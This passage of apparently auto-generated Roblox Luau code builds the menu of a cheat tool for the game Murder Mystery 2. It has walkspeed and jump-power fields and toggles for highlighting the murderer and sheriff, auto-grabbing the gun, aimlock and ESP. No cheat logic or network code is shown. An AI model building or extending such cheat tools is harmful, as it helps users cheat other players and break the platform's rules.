G2L["3a"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrwalkspeed.TextBox
G2L["3b"] = Instance.new("TextBox", G2L["38"]);
G2L["3b"]["TextColor3"] = Color3.fromRGB(215, 215, 215);
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["TextWrapped"] = true;
G2L["3b"]["TextSize"] = 18;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(127, 129, 129);
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["Size"] = UDim2.new(0, 60, 0, 26);
G2L["3b"]["Position"] = UDim2.new(0.81551, 0, 0.14286, 0);
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[]];
G2L["3b"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrwalkspeed.TextBox.UICorner
G2L["3c"] = Instance.new("UICorner", G2L["3b"]);
G2L["3c"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrwalkspeed.TextBox.LocalScript
G2L["3d"] = Instance.new("LocalScript", G2L["3b"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrjumppower
G2L["3e"] = Instance.new("Frame", G2L["22"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["3e"]["Size"] = UDim2.new(0, 374, 0, 35);
G2L["3e"]["Position"] = UDim2.new(0.023, 0, 0.825, 0);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Name"] = [[plrjumppower]];
G2L["3e"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrjumppower.UICorner
G2L["3f"] = Instance.new("UICorner", G2L["3e"]);
G2L["3f"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrjumppower.TextLabel
G2L["40"] = Instance.new("TextLabel", G2L["3e"]);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["TextSize"] = 14;
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["40"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["40"]["BackgroundTransparency"] = 1;
G2L["40"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Text"] = [[Jump-Power]];
G2L["40"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrjumppower.TextBox
G2L["41"] = Instance.new("TextBox", G2L["3e"]);
G2L["41"]["TextColor3"] = Color3.fromRGB(215, 215, 215);
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextWrapped"] = true;
G2L["41"]["TextSize"] = 18;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(127, 129, 129);
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["41"]["Size"] = UDim2.new(0, 60, 0, 26);
G2L["41"]["Position"] = UDim2.new(0.81551, 0, 0.14286, 0);
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[]];
G2L["41"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrjumppower.TextBox.UICorner
G2L["42"] = Instance.new("UICorner", G2L["41"]);
G2L["42"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrjumppower.TextBox.LocalScript
G2L["43"] = Instance.new("LocalScript", G2L["41"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement
G2L["44"] = Instance.new("Folder", G2L["2"]);
G2L["44"]["Name"] = [[HubElement]];

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element
G2L["45"] = Instance.new("Frame", G2L["44"]);
G2L["45"]["Visible"] = false;
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["Size"] = UDim2.new(0, 391, 0, 254);
G2L["45"]["Position"] = UDim2.new(0.24517, 0, 0.03745, 0);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Name"] = [[Element]];
G2L["45"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightmurderer
G2L["46"] = Instance.new("Frame", G2L["45"]);
G2L["46"]["BorderSizePixel"] = 0;
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["46"]["Size"] = UDim2.new(0, 374, 0, 43);
G2L["46"]["Position"] = UDim2.new(0.02556, 0, 0.07417, 0);
G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["Name"] = [[highlightmurderer]];
G2L["46"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightmurderer.UICorner
G2L["47"] = Instance.new("UICorner", G2L["46"]);
G2L["47"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightmurderer.TextLabel
G2L["48"] = Instance.new("TextLabel", G2L["46"]);
G2L["48"]["BorderSizePixel"] = 0;
G2L["48"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["TextSize"] = 14;
G2L["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["48"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["48"]["BackgroundTransparency"] = 1;
G2L["48"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["48"]["Text"] = [[Highlight Murderer]];
G2L["48"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightmurderer.TextButton
G2L["49"] = Instance.new("TextButton", G2L["46"]);
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["AutoButtonColor"] = false;
G2L["49"]["TextSize"] = 14;
G2L["49"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Text"] = [[]];
G2L["49"]["Position"] = UDim2.new(0.89305, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightmurderer.TextButton.UICorner
G2L["4a"] = Instance.new("UICorner", G2L["49"]);
G2L["4a"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightmurderer.TextButton.LocalScript
G2L["4b"] = Instance.new("LocalScript", G2L["49"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightmurderer.TextButton.ImageLabel
G2L["4c"] = Instance.new("ImageLabel", G2L["49"]);
G2L["4c"]["ZIndex"] = 0;
G2L["4c"]["BorderSizePixel"] = 0;
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["Image"] = [[rbxassetid://10709790644]];
G2L["4c"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["4c"]["Visible"] = false;
G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightsheriff
G2L["4d"] = Instance.new("Frame", G2L["45"]);
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["4d"]["Size"] = UDim2.new(0, 374, 0, 43);
G2L["4d"]["Position"] = UDim2.new(0.026, 0, 0.28437, 0);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Name"] = [[highlightsheriff]];
G2L["4d"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightsheriff.UICorner
G2L["4e"] = Instance.new("UICorner", G2L["4d"]);
G2L["4e"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightsheriff.TextLabel
G2L["4f"] = Instance.new("TextLabel", G2L["4d"]);
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["TextSize"] = 14;
G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4f"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["4f"]["BackgroundTransparency"] = 1;
G2L["4f"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Text"] = [[Highlight Sheriff]];
G2L["4f"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightsheriff.TextButton
G2L["50"] = Instance.new("TextButton", G2L["4d"]);
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["AutoButtonColor"] = false;
G2L["50"]["TextSize"] = 14;
G2L["50"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[]];
G2L["50"]["Position"] = UDim2.new(0.89305, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightsheriff.TextButton.UICorner
G2L["51"] = Instance.new("UICorner", G2L["50"]);
G2L["51"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightsheriff.TextButton.LocalScript
G2L["52"] = Instance.new("LocalScript", G2L["50"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightsheriff.TextButton.ImageLabel
G2L["53"] = Instance.new("ImageLabel", G2L["50"]);
G2L["53"]["ZIndex"] = 0;
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["Image"] = [[rbxassetid://10709790644]];
G2L["53"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["53"]["Visible"] = false;
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.autograbgun
G2L["54"] = Instance.new("Frame", G2L["45"]);
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["54"]["Size"] = UDim2.new(0, 374, 0, 43);
G2L["54"]["Position"] = UDim2.new(0.026, 0, 0.49731, 0);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Name"] = [[autograbgun]];
G2L["54"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.autograbgun.UICorner
G2L["55"] = Instance.new("UICorner", G2L["54"]);
G2L["55"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.autograbgun.TextLabel
G2L["56"] = Instance.new("TextLabel", G2L["54"]);
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["TextSize"] = 14;
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["56"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["56"]["BackgroundTransparency"] = 1;
G2L["56"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Text"] = [[Auto Grab Gun]];
G2L["56"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.autograbgun.TextButton
G2L["57"] = Instance.new("TextButton", G2L["54"]);
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["AutoButtonColor"] = false;
G2L["57"]["TextSize"] = 14;
G2L["57"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["57"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Text"] = [[]];
G2L["57"]["Position"] = UDim2.new(0.89305, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.autograbgun.TextButton.UICorner
G2L["58"] = Instance.new("UICorner", G2L["57"]);
G2L["58"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.autograbgun.TextButton.LocalScript
G2L["59"] = Instance.new("LocalScript", G2L["57"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.autograbgun.TextButton.ImageLabel
G2L["5a"] = Instance.new("ImageLabel", G2L["57"]);
G2L["5a"]["ZIndex"] = 0;
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["Image"] = [[rbxassetid://10709790644]];
G2L["5a"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["5a"]["Visible"] = false;
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers
G2L["5b"] = Instance.new("Frame", G2L["45"]);
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["5b"]["Size"] = UDim2.new(0, 374, 0, 43);
G2L["5b"]["Position"] = UDim2.new(0.02344, 0, 0.71224, 0);
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["Name"] = [[highlightplayers]];
G2L["5b"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers.UICorner
G2L["5c"] = Instance.new("UICorner", G2L["5b"]);
G2L["5c"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers.TextLabel
G2L["5d"] = Instance.new("TextLabel", G2L["5b"]);
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["TextSize"] = 14;
G2L["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["5d"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["5d"]["BackgroundTransparency"] = 1;
G2L["5d"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Text"] = [[Highlight All Players]];
G2L["5d"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers.TextButton
G2L["5e"] = Instance.new("TextButton", G2L["5b"]);
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["AutoButtonColor"] = false;
G2L["5e"]["TextSize"] = 14;
G2L["5e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Text"] = [[]];
G2L["5e"]["Position"] = UDim2.new(0.89305, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers.TextButton.UICorner
G2L["5f"] = Instance.new("UICorner", G2L["5e"]);
G2L["5f"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers.TextButton.LocalScript
G2L["60"] = Instance.new("LocalScript", G2L["5e"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers.TextButton.ImageLabel
G2L["61"] = Instance.new("ImageLabel", G2L["5e"]);
G2L["61"]["ZIndex"] = 0;
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["Image"] = [[rbxassetid://10709790644]];
G2L["61"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["61"]["Visible"] = false;
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers.TextLabel
G2L["62"] = Instance.new("TextLabel", G2L["5b"]);
G2L["62"]["TextWrapped"] = true;
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["TextSize"] = 12;
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["62"]["TextColor3"] = Color3.fromRGB(136, 137, 137);
G2L["62"]["BackgroundTransparency"] = 1;
G2L["62"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Text"] = [[Useful if you are the murderer]];
G2L["62"]["Position"] = UDim2.new(0.44146, 0, 0.18814, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement
G2L["63"] = Instance.new("Folder", G2L["2"]);
G2L["63"]["Name"] = [[VisualElement]];

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element
G2L["64"] = Instance.new("Frame", G2L["63"]);
G2L["64"]["Visible"] = false;
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["Size"] = UDim2.new(0, 391, 0, 251);
G2L["64"]["Position"] = UDim2.new(0.24517, 0, 0.04494, 0);
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Name"] = [[Element]];
G2L["64"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock
G2L["65"] = Instance.new("Frame", G2L["64"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["65"]["Size"] = UDim2.new(0, 374, 0, 43);
G2L["65"]["Position"] = UDim2.new(0.02044, 0, 0.02972, 0);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Name"] = [[aimlock]];
G2L["65"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.UICorner
G2L["66"] = Instance.new("UICorner", G2L["65"]);
G2L["66"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.TextLabel
G2L["67"] = Instance.new("TextLabel", G2L["65"]);
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["TextSize"] = 14;
G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["67"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["67"]["BackgroundTransparency"] = 1;
G2L["67"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[Aimlock]];
G2L["67"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.TextButton
G2L["68"] = Instance.new("TextButton", G2L["65"]);
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["AutoButtonColor"] = false;
G2L["68"]["TextSize"] = 14;
G2L["68"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["68"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["Text"] = [[]];
G2L["68"]["Position"] = UDim2.new(0.77807, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.TextButton.UICorner
G2L["69"] = Instance.new("UICorner", G2L["68"]);
G2L["69"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.TextButton.LocalScript
G2L["6a"] = Instance.new("LocalScript", G2L["68"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.TextButton.ImageLabel
G2L["6b"] = Instance.new("ImageLabel", G2L["68"]);
G2L["6b"]["ZIndex"] = 0;
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["Image"] = [[rbxassetid://10709790644]];
G2L["6b"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["6b"]["Visible"] = false;
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.TextBox
G2L["6c"] = Instance.new("TextBox", G2L["65"]);
G2L["6c"]["TextColor3"] = Color3.fromRGB(224, 224, 224);
G2L["6c"]["BorderSizePixel"] = 0;
G2L["6c"]["TextWrapped"] = true;
G2L["6c"]["TextSize"] = 14;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(77, 78, 78);
G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6c"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["6c"]["Position"] = UDim2.new(0.89037, 0, 0.15209, 0);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6c"]["Text"] = [[]];

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.TextBox.UICorner
G2L["6d"] = Instance.new("UICorner", G2L["6c"]);
G2L["6d"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.skeletonesp
G2L["6e"] = Instance.new("Frame", G2L["64"]);
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["6e"]["Size"] = UDim2.new(0, 374, 0, 43);
G2L["6e"]["Position"] = UDim2.new(0.02044, 0, 0.24088, 0);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["Name"] = [[skeletonesp]];
G2L["6e"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.skeletonesp.UICorner
G2L["6f"] = Instance.new("UICorner", G2L["6e"]);
G2L["6f"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.skeletonesp.TextLabel
G2L["70"] = Instance.new("TextLabel", G2L["6e"]);
G2L["70"]["BorderSizePixel"] = 0;
G2L["70"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["TextSize"] = 14;
G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["70"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["70"]["BackgroundTransparency"] = 1;
G2L["70"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["70"]["Text"] = [[Skeleton ESP]];
G2L["70"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.skeletonesp.TextButton
G2L["71"] = Instance.new("TextButton", G2L["6e"]);
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["AutoButtonColor"] = false;
G2L["71"]["TextSize"] = 14;
G2L["71"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["71"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Text"] = [[]];
G2L["71"]["Position"] = UDim2.new(0.89305, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.skeletonesp.TextButton.UICorner
G2L["72"] = Instance.new("UICorner", G2L["71"]);
G2L["72"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.skeletonesp.TextButton.LocalScript
G2L["73"] = Instance.new("LocalScript", G2L["71"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.skeletonesp.TextButton.ImageLabel
G2L["74"] = Instance.new("ImageLabel", G2L["71"]);
G2L["74"]["ZIndex"] = 0;
G2L["74"]["BorderSizePixel"] = 0;
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["Image"] = [[rbxassetid://10709790644]];
G2L["74"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["74"]["Visible"] = false;
G2L["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["74"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.boxesp
G2L["75"] = Instance.new("Frame", G2L["64"]);
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["75"]["Size"] = UDim2.new(0, 374, 0, 43);
G2L["75"]["Position"] = UDim2.new(0.02, 0, 0.45, 0);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Name"] = [[boxesp]];
G2L["75"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.boxesp.UICorner
G2L["76"] = Instance.new("UICorner", G2L["75"]);
G2L["76"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.boxesp.TextLabel
G2L["77"] = Instance.new("TextLabel", G2L["75"]);
G2L["77"]["BorderSizePixel"] = 0;
G2L["77"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
